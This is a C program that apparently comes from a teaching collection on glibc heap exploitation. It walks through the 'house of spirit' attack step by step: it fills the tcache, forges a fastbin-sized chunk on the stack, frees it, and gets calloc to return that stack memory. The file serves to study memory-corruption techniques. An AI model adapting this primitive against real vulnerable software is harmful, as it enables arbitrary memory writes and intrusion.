#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	setbuf(stdout, NULL);

	puts("This file demonstrates the house of spirit attack.");
	puts("This attack adds a non-heap pointer into fastbin, thus leading to (nearly) arbitrary write.");
	puts("Required primitives: known target address, ability to set up the start/end of the target memory");

	puts("\nStep 1: Allocate 7 chunks and free them to fill up tcache");
	void *chunks[7];
	for(int i=0; i<7; i++) {
		chunks[i] = malloc(0x30);
	}
	for(int i=0; i<7; i++) {
		free(chunks[i]);
	}

	puts("\nStep 2: Prepare the fake chunk");
	// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)
	long fake_chunks[10] __attribute__ ((aligned (0x10)));
	printf("The target fake chunk is at %p\n", fake_chunks);
	printf("It contains two chunks. The first starts at %p and the second at %p.\n", &fake_chunks[1], &fake_chunks[9]);
	printf("This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
	puts("... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end.");
	printf("Now set the size of the chunk (%p) to 0x40 so malloc will think it is a valid chunk.\n", &fake_chunks[1]);
	fake_chunks[1] = 0x40; // this is the size

	printf("The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) && < av->system_mem (< 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n");
	printf("Set the size of the chunk (%p) to 0x1234 so freeing the first chunk can succeed.\n", &fake_chunks[9]);
	fake_chunks[9] = 0x1234; // nextsize

	puts("\nStep 3: Free the first fake chunk");
	puts("Note that the address of the fake chunk must be 16-byte aligned.\n");
	void *victim = &fake_chunks[2];
	free(victim);

	puts("\nStep 4: Take out the fake chunk");
	printf("Now the next calloc will return our fake chunk at %p!\n", &fake_chunks[2]);
	printf("malloc can do the trick as well, you just need to do it for 8 times.");
	void *allocated = calloc(1, 0x30);
	printf("malloc(0x30): %p, fake chunk: %p\n", allocated, victim);

	assert(allocated == victim);
}
